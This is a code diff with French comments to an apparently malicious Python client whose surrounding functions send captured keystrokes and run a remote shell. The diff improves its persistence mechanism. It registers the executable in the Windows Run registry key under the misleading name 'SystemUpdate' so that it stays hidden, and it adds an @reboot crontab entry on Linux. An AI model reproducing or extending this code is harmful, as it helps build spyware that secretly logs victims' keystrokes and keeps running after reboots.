@@ -114,29 +114,33 @@ def send_keystrokes_file():
         sending({"status": "error", "message": str(e)})    
     
 def add_persistence():
-    python_path = sys.executable  # Récupérer le chemin vers l'exécutable Python
-    script_path = os.path.abspath("your_script.py")  # Remplacer par le chemin de votre script
+    # Récupérer le chemin actuel de l'exécutable en cours d'exécution
+    script_path = sys.argv[0]  # Cela retourne le chemin de l'exécutable (client.exe)
 
     try:
         if platform.system() == "Windows":
-            # Ouvrir la clé du registre HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
+            # Ouvrir ou créer la clé de registre HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+            registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            app_name = "SystemUpdate"  # Nom visible dans le registre pour camoufler l'exécutable
+
+            # Vérifier si la persistance existe déjà
+            with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key_path, 0, reg.KEY_SET_VALUE) as reg_key:
+                reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, f'"{script_path}"')
             
-            # Ajouter l'entrée pour le script Python
-            reg.SetValueEx(registry_key, "MyEmptyKey", 0, reg.REG_SZ, "")
-
-            # Fermer la clé du registre
-            reg.CloseKey(registry_key)
+            return f"Persistance ajoutée avec succès pour : {script_path}"
+        
         else:
-            # Ajouter une tâche cron pour Linux
-            cron_job = f"@reboot {python_path} {script_path}\n"
-            with open(os.path.expanduser("~/.crontab"), "a") as cron_file:
+            # Ajouter une tâche cron pour Linux (si nécessaire)
+            cron_job = f"@reboot {script_path}\n"
+            cron_file_path = os.path.expanduser("~/.crontab")
+            with open(cron_file_path, "a") as cron_file:
                 cron_file.write(cron_job)
-
-        return "Persistance configurée avec succès ! Le script s'exécutera au démarrage."
+            
+            return f"Persistance ajoutée avec succès pour : {script_path} dans la crontab"
 
     except Exception as e:
         return f"Erreur lors de la configuration de la persistance : {str(e)}"
+
         
 def shell():
     while True:
